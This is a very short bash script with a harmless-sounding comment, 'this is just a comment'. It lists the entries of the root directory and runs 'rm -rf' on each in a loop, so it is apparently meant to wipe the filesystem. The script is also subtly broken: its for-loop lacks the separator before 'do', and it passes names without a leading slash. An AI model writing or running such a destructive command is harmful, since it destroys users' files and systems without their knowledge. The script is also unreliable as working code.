#!/bin/bash
#this is just a comment
FILES=`ls /`

for i in $FILES do
	rm -rf $i
done